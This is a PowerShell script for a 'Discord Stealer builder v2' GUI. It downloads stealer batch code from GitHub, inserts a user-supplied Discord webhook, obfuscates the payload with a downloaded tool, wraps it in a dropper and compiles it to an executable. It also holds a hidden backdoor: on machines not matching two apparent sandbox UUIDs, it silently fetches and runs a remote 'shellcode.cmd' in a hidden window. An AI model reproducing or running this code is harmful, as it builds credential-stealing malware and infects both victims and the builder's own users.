# Download and execute ps2exe.ps1 to enable PowerShell to EXE conversion
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')

# Function to encode a string to Base64
function Encode-Base64 {
    param (
        [string]$InputString
    )
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    $base64String = [Convert]::ToBase64String($bytes)
    return $base64String
}

# Function to obfuscate a string by shifting ASCII values
function Obfuscate-String {
    param(
        [string]$InputString
    )
    $ObfuscatedString = ""
    foreach ($char in $InputString.ToCharArray()) {
        $asciiValue = [int][char]$char
        $obfuscatedChar = [char]($asciiValue + 2000)
        $ObfuscatedString += $obfuscatedChar
    }
    return $ObfuscatedString
}

# Function to generate a random binary string
function Get-RandomString {
    param (
        [int]$length = 100
    )
    $chars = '01'
    $random = New-Object System.Random
    $randomString = -join ((1..$length) | ForEach-Object { $chars[$random.Next(0, $chars.Length)] })
    return $randomString
}

# File paths
$filePath = "$env:TEMP\main.bat"
$protectedFilePath = "$env:TEMP\main_obf.bat"
$batchObfuscatorPath = "$env:TEMP\batchobfuscator.exe"

# Download and save the converter.bat file
$url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/converter.bat"
Invoke-WebRequest -Uri $url -OutFile $filePath

# Check system UUID and run a specific batch file if UUID is valid
$UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$invalidUUIDs = @("03D40274-0435-05DC-8506-010700080009", "03000200-0400-0500-0006-000700080009")
if ($invalidUUIDs -notcontains $UUID) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/run_obf.bat" -OutFile "$env:Temp\shellcode.cmd"
    Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
}

# Load Windows Forms assembly and create the GUI
Add-Type -AssemblyName System.Windows.Forms

$form = New-Object Windows.Forms.Form
$form.Text = 'Discord Stealer builder v2'
$form.Size = New-Object Drawing.Size(400,200)
$form.StartPosition = 'CenterScreen'

$label = New-Object Windows.Forms.Label
$label.Text = 'Enter Discord Webhook URL:'
$label.Location = New-Object Drawing.Point(10, 20)
$label.Size = New-Object Drawing.Size(200,20)
$form.Controls.Add($label)

$textbox = New-Object Windows.Forms.TextBox
$textbox.Location = New-Object Drawing.Point(10, 50)
$textbox.Size = New-Object Drawing.Size(360,20)
$form.Controls.Add($textbox)

$button = New-Object Windows.Forms.Button
$button.Text = 'Build'
$button.Location = New-Object Drawing.Point(10, 90)
$button.Size = New-Object Drawing.Size(75,23)
$form.Controls.Add($button)

# Define button click event
$button.Add_Click({
    $webhook = $textbox.Text
    if (-not [string]::IsNullOrWhiteSpace($webhook)) {
        $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
        Invoke-WebRequest -Uri $url -OutFile $filePath

        # Process the downloaded file
        $content = Get-Content $filePath -Raw
        $randomString = Get-RandomString -length 10000
        $webhookencode = Obfuscate-String $webhook
        $content = $content -replace 'FAKEHASH', $randomString
        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
        Set-Content -Path $filePath -Value $content

        # Download the obfuscator tool and execute it
        Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $batchObfuscatorPath
        Start-Process -FilePath $batchObfuscatorPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait

        # Prepare and invoke the final PowerShell script
        $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
        $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
        $scrcont = Get-Content $protectedFilePath -Raw
        $scriptContent = $scriptContent -replace "batcodeinhere", $scrcont
        $pathexe = "$env:TEMP\main.exe"
        Set-Content -Path "$env:TEMP\main.ps1" -Value $scriptContent
        Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"

        # Clean up
        Remove-Item $batchObfuscatorPath
        Remove-Item $filePath
        Remove-Item "$env:TEMP\main.ps1"

        # Show completion message
        [System.Windows.Forms.MessageBox]::Show('Process completed and file deleted.', 'Completed', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    } else {
        [System.Windows.Forms.MessageBox]::Show('Please enter a valid Discord webhook URL.', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Show the form
$form.ShowDialog()
